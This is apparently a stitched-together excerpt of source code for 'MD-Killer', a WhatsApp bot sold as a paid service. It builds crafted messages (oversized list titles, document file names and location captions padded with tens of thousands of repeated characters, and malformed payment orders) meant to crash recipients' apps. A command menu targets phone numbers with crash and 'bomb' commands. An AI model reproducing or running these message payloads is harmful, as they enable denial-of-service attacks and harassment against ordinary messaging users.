...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍м∂-кιℓℓєя╮⭑ ☠️⃰͜͡؜PeNeti🔥᜴ # м∂-кιℓℓєя999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ MD-Kilker🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
...
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:mpeneti@gmail.com\n
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷м∂-кιℓℓєя•ᝯׁ֒ꭈׁׅɑׁׅׅ꯱hׁׅ֮̿╮⭑ ☠м∂-кιℓℓєя𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆᷍м∂-кιℓℓєя╮⭑ ☠️⃰͜͡؜🔥᜴▴м∂-кιℓℓєяཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
...
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰м∂-кιℓℓєя ᭢ꫀ᭙ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/5a8f5a9b448c2ee114367.jpg" } }, { upload: deltaxcrash.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ MD-Killer ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍м∂-кιℓℓєяⱧ̿╮⭑ ☠️⃰͜͡؜м∂-кιℓℓєя🔥᜴▴м∂-кιℓℓєя699ཀ͜͡😈⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍м∂-кιℓℓєяⱧ╮⭑ ☠️⃰͜͡؜м∂-кιℓℓєя🔥᜴▴м∂-кιℓℓєя699ཀ͜͡😈⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
"title": "MD-Killer [B.E.T.A]", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/5a8f5a9b448c2ee114367.jpg", 
"sourceUrl": " " }}}, { quoted: m }) }
...
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/5a8f5a9b448c2ee114367.jpg' }}}}
...
「 *✦ MD-Killer BUG1 ✦* 」
ᯤ  ${prefix}killer555 263xxx
ᯤ  ${prefix}restart-maker 263xxx
ᯤ  ${prefix}clear-data 263xxxx
ᯤ  ${prefix}mdslay 263xxx
ᯤ  ${prefix}crash-total 263xxx
ᯤ  ${prefix}mdbomb 263xxx
ᯤ  ${prefix}mdkill  263xxx
╰×͜×
「 *✦ MD-Killer BUG2 ✦* 」
ᯤ  ${prefix}reboot 263xxx
ᯤ  ${prefix}reset 263xxx
ᯤ  ${prefix}🗿 263xxx
ᯤ  ${prefix}🔥 263xxx
╰×͜×
「 *✦ MD-Killer BUGgc ✦* 」
...
╰×͜×
「 *✦ 「 *✦ MD-Killer  vip ✦* 」
ᯤ  ${prefix}mdstrike <263xxx, amount>
ᯤ  ${prefix}killer147 <263xxx|amount>
ᯤ  ${prefix}reset-ui <263xxx, amount>
ᯤ  ${prefix}mdcrash <263xxx, amount>
ᯤ  ${prefix}maker1 <263xxx, amount>
ᯤ  ${prefix}shoot <263xxx, amount>
╰×͜×`
	           ...
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            ...
                            thumbnailUrl: 'https://telegra.ph/file/5a8f5a9b448c2ee114367.jpg', 
                            //sourceUrl: global.isLink,
                            previewType: "PHOTO", 
                            mediaType: 1,
...
} catch (err) {m.reply(`Fitur ini memerlukan persetujuan owner tools mdkill`)}
} else reply(' Fitur ini memerlukan persetujuan owner tools mdkill')
}
break
...
let teks22 = `LIST HARGA PANEL mdkill\n\n 8 GB 5K \n UNLI 10K\n\n spesifikasi panel\n ram 16 gb\n room 200 gb \n anti delay`
const buf = await getBuffer(`https://telegra.ph/file/5a8f5a9b448c2ee114367.jpg`)
for (let x of data) {
...
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 263789660160`)
...
break
//=================================================//
case '🗿': case 'mdslay': case 'crash-total': case '🔥': {
...
break
//=================================================//
case 'killer555': case 'restart-maker': case 'deltax5': case 'clear-data': {
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻MD-Killer⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
